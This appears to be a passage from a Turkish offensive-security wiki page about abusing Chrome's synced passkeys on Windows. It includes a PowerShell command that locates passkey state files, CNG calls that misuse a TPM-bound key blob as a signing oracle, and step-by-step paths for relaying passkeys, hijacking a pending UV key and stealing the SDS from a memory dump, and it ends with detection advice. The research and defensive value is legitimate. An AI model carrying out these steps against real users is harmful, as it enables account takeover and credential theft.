- **`Sync Data\LevelDB`**, protobuf ile kodlanmış **`WebauthnCredentialSpecifics`** kayıtlarını depolar. Aynı kullanıcıya ait bir süreç, senkronize edilmiş passkey'ler için **RP ID**, **kullanıcı adı**, **credential ID** ve şifrelenmiş özel anahtar materyalini listeleyebilir.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`**, **`wrapped_identity_private_key`** ve senkronize edilmiş kimlik bilgilerini kurtarmak için kullanılan wrapped secret gibi yerel cihaz kaydı durumunu depolar.<sup>[[4]](#references)</sup>

Hızlı ön inceleme:

```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM'e bağlı anahtar blob'ları yerel imzalama oracle'ı olarak yine de kötüye kullanılabilir

Tarayıcı, TPM destekli bir kimlik anahtarını **`NCRYPT_OPAQUE_KEY_BLOB`** olarak dışa aktarır ve bu blob'u kullanıcının erişebildiği bir konumda saklarsa, malware'in ham özel anahtarı çıkarması **gerekmez**. Blob'u **aynı makinede** yeniden içe aktarabilir ve yerel TPM'den saldırganın denetimindeki verileri imzalamasını isteyebilir:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

This, **hardware binding'in cihaz dışına aktarımı engellediği ancak ele geçirilmiş uç noktada aynı kullanıcı tarafından kullanımı engellemediği** anlamına gelir.

### Uygulamadaki kötüye kullanım yolları

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
   - Chrome'un LevelDB'inden `WebauthnCredentialSpecifics` kayıtlarını listeleyin.
   - Bir passkey oturumu başlatıp yeni bir WebAuthn challenge alın.
   - Cloud-authenticator isteğinin binding'ini imzalamak için çalınan `wrapped_identity_private_key` blob'unu kurbanın TPM'inde kullanın.
   - Dönen assertion'ı relying party'ye iletin.
   - Bu yöntem, RP'nin `userVerification=preferred` değerini kabul etmesi veya **`UV=0`** olan assertion'ları reddetmemesi durumunda özellikle değerlidir.
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
   - `passkey_enclave_state` dosyasını silerek veya geçerli, imzalı bir `device/forget` işlemi göndererek yeniden kayda alınmayı zorlayın.
   - Kayıt işlemi cihazı **`uv_key_pending`** durumunda bırakırsa, saldırganın kontrolündeki bir UV public key kaydedin.
   - Sağlayıcı yeni UV key'in attestation'ını / secure-hardware kaynağını doğrulamazsa, saldırganın key'iyle daha sonra atılan imzalar **`UV=1`** olarak değerlendirilir.
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
   - Chrome'un senkronize edilmiş passkey master secret'ını getirmesi için kurtarma veya yeniden katılma işlemini zorlayın.
   - `passkey_enclave_state` dosyasının yeniden oluşturulmasını/değiştirilmesini izleyin, ardından düz metin **security domain secret (SDS)** bellekteyken Chrome belleğini dökümleyin.
   - Kurtarılan SDS'yi kullanarak her `WebauthnCredentialSpecifics` kaydındaki şifrelenmiş alanları çözün ve taşınabilir WebAuthn private key'lerini kurtarın.

### DFIR / tespit önerileri

- `passkey_enclave_state` dosyasının **silinmesini/yeniden oluşturulmasını** izleyin.<sup>[[4]](#references)</sup>
- Tarayıcı dışı işlemlerin Chrome **`Sync Data\LevelDB`** alanına olağandışı erişimi için uyarı oluşturun.
- **Chrome bellek dökümleri** veya şüpheli süreçler arası bellek erişimi için uyarı oluşturun.
- Tekrarlanan **Google Password Manager kurtarma PIN'i** istemlerini veya beklenmedik yeniden kaydı inceleyin.
- WebAuthn **`signCount`** değerinin senkronize passkey'lerde genellikle işe yaramadığını ve sabit kalabileceğini unutmayın; bu nedenle klasik klon tespiti zayıftır.

## References

- [1] [Unit 42 – Yüksek Değerli Sektörleri Hedef Alan Yıllarca Tespit Edilmemiş Operasyonlara Yönelik Bir İnceleme](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: SMTP üzerinden Word VBA macro phishing → hMailServer kimlik bilgisi çözme → SYSTEM için Veeam CVE-2023-27532](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon'un İç Yüzü: Gizli Bir Saldırı Operasyonunun Relay Ağı ve İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Passkey'i Ele Geçirme: Parolasız Kimlik Doğrulamada Yeni Bir Saldırı Yüzeyi](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows Hacking: Microsoft Sistem ve Ağlarına Yönelik Saldırılar](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store'un Gerçek İşleyişi: NTDS.dit'in İç Yüzü (Bölüm 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Uzak Lsass Bellek Dökümünden Parolaları Alma](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho, Still Toolkit ile Siber Casusluk Cephaneliğini Genişletiyor](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW işlevi ve `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy `/B` yedekleme modu](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – etkin oturumları sonlandırma](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
